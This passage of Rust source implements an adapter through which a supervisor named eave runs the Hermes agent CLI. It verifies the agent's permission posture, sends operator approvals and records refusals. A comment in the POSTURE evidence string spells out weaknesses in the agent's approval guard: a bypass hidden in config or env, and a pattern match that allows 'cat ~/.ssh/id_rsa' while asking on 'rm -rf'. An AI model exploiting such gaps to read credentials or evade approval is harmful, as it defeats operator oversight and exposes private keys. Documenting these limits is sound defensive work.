                 for a posture it has not checked"
                    .into(),
            ),
        };
        if let Preflight::Refused(reason) = probe {
            self.announce(session_id, mode.clone()).await;
            self.emit(SessionEvent::PostureRefused {
                mode: mode.unwrap_or_else(|| "unstated".into()),
                reason: reason.clone(),
            })
            .await;
            return self.mark_refused(reason).await;
        }

        self.announce(session_id.clone(), mode).await;
        self.shared.ready.ready(session_id);
    }

    /// State the session and the posture it opened in — once, whether or
    /// not that posture is one eave will run under. A refusal that never
    /// named the session would leave the transcript with a verdict and no
    /// subject.
    async fn announce(&self, session_id: String, permission_mode: Option<String>) {
        self.emit(SessionEvent::Init {
            session_id,
            permission_mode,
            // Empty is the honest answer, not a placeholder: this provider
            // has announced no command inventory to eave. ACP's
            // `availableCommands` is not read yet — see Not done.
            slash_commands: Vec::new(),
        })
        .await;
    }

    /// Refuse before any posture could be stated at all.
    async fn refuse(&self, reason: String) {
        self.emit(SessionEvent::PostureRefused {
            mode: "unstated".into(),
            reason: reason.clone(),
        })
        .await;
        self.mark_refused(reason).await;
    }

    async fn mark_refused(&self, reason: String) {
        self.shared.ready.refuse(reason);
    }

    async fn send(&self, frame: Value) {
        wire::try_write(&self.stdin, &frame).await;
    }

    /// The send's result is deliberately dropped: a gone receiver just
    /// means nobody is watching, and the reader keeps draining so the
    /// child never blocks on a full pipe.
    async fn emit(&self, event: SessionEvent) {
        let _ = self.tx.send(event).await;
    }

    async fn emit_all(&self, events: Vec<SessionEvent>) {
        for event in events {
            self.emit(event).await;
        }
    }
}

// ---------------------------------------------------------------------------

#[async_trait]
impl crate::provider::AgentAdapter for HermesSession {
    const PROVIDER_ID: &'static str = HERMES.provider_id;

    const POSTURE: crate::provider::PostureProof = crate::provider::PostureProof::Verified {
        evidence: "hermes.rs: posture is proven TWICE per spawn — `modes.currentModeId` read off \
                   the ACP wire, plus two dangerous canaries through `hermes approvals test` (a \
                   dry-run evaluator that never executes), which is the only check that can see a \
                   bypass living in config or env. Slice AW proved `--ignore-user-config` does NOT \
                   close the approval bypass — the gate reads a different config loader — so the \
                   canary is load-bearing. LIMITS, stated because Verified is binary and this is \
                   not parity with Claude: the guard is pattern-based, so it asks on `rm -rf` and \
                   ALLOWS `cat ~/.ssh/id_rsa`; Hermes stops waiting after 60s and denies on its \
                   own; and ACP carries no free text on the response, so the operator's deny \
                   message never reaches the model.",
    };

    const REWIND: crate::provider::RewindSupport = crate::provider::RewindSupport::None {
        reason: "Hermes' ACP adapter has no conversation rewind. Its whole method set is \
                 session/new, prompt, request_permission, set_config_option, set_mode and \
                 update — read from the adapter's own Python source 2026-08-31, so this is a \
                 complete list rather than a failed search.",
    };

    const TUNING: crate::tuning::TuningSupport = crate::tuning::TuningSupport {
        effort: crate::tuning::EffortSupport::None {
            reason: "Hermes 0.20.4 reads its effort from `config.yaml` (`agent.reasoning_effort`) \
                     only: the top-level `--reasoning LEVEL` reaches `hermes chat` and not \
                     `hermes acp`, whose parser has no such flag, and the ACP adapter's \
                     `set_config_option` stores the value on the session and nothing reads it \
                     back (acp_adapter/server.py, 2026-09-02). Setting it would mean writing the \
                     operator's config file, which eave does not do.",
        },
        speed: crate::tuning::SpeedSupport::None {
            reason: "no fast lane on this CLI (2026-09-02).",
        },
    };

    fn spawn(cfg: &SpawnConfig) -> Result<(Self, mpsc::Receiver<SessionEvent>), SessionError> {
        HermesSession::spawn(cfg)
    }
}

#[async_trait]
impl AgentSession for HermesSession {
    fn identity(&self) -> ProcIdentity {
        self.child.identity()
    }

    fn provider_session_id(&self) -> Option<String> {
        self.shared.stream.lock().unwrap().session_id.clone()
    }

    fn in_flight_tools(&self) -> usize {
        self.shared.stream.lock().unwrap().stream.in_flight()
    }

    fn last_activity(&self) -> Instant {
        self.child.last_activity()
    }

    fn watch(&self) -> SessionWatch {
        self.child.watch()
    }

    async fn send_user_message(
        &mut self,
        text: &str,
        images: &[crate::media::ImageRef],
    ) -> Result<(), SessionError> {
        let session_id = self.acp_session_id().await?;
        let id = self.next_id.fetch_add(1, Ordering::SeqCst);
        wire::write_frame(
            self.stdin(),
            &wire::prompt_frame(id, &session_id, text, &crate::media::encode_all(images)?),
        )
        .await
    }

    fn pending_approvals(&self) -> usize {
        self.shared.stream.lock().unwrap().pending.len()
    }

    /// Answer one permission question by replying to the JSON-RPC request
    /// Hermes is blocked on.
    ///
    /// `Ok(false)` means the question was not open — already answered, or
    /// aged out under [`APPROVAL_STALE_AFTER`]. That is a race, not an
    /// error, and it must never reach the pipe: a stale decision would be
    /// ignored by Hermes and journaled by eave as if it had landed.
    ///
    /// **The deny message does not travel.** ACP's
    /// `RequestPermissionResponse` carries an outcome and an option id and
    /// nothing else, so "denied — commit first" reaches Hermes as the same
    /// bytes as "denied". Under Claude the message is handed to the model
    /// verbatim; here it is journaled by eave and stops there. Stated
    /// rather than papered over: the alternative was smuggling it into
    /// `_meta`, which Hermes does not read, and which would look like
    /// delivery without being it.
    async fn respond_to_approval(
        &mut self,
        request_id: &str,
        decision: &ApprovalDecision,
    ) -> Result<bool, SessionError> {
        let wanted = match decision {
            ApprovalDecision::Allow => OPTION_ALLOW,
            ApprovalDecision::Deny { .. } => OPTION_DENY,
        };
        let rpc_id = {
            let stream = self.shared.stream.lock().unwrap();
            let Some(pending) = stream.pending.get(request_id) else {
                return Ok(false);
            };
            if !pending.offers_id(wanted) {
                // Hermes offered a set this adapter cannot answer from.
                // Guessing an id would be answering a question eave did
                // not understand, on the operator's behalf.
                return Err(SessionError::Io(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!(
                        "Hermes did not offer the {wanted:?} option for this permission \
                         request, so eave cannot deliver that decision without guessing"
                    ),
                )));
            }
            pending.rpc_id.clone()
        };
        permission::deliver(self.stdin(), &rpc_id, Some(wanted)).await?;
        // Only now is the question closed: a failed write leaves it open
        // so the operator can try again rather than facing a dead card.
        self.shared.stream.lock().unwrap().pending.close(request_id);
        Ok(true)
    }

    async fn interrupt(&mut self) -> Result<(), SessionError> {
        Ok(())
    }

    /// Unsupported, and stated in one place only: the reason an operator
    /// reads lives on `REWIND`, so this never grows a second sentence
    /// that could drift from it.
    async fn rewind(
        &mut self,
        _target: &crate::session::RewindTarget,
    ) -> Result<crate::session::RewindOutcome, SessionError> {
        Ok(crate::session::RewindOutcome::Unsupported)
    }

    async fn kill(&mut self) -> Result<KillReport, SessionError> {
        self.child.kill().await
    }
}
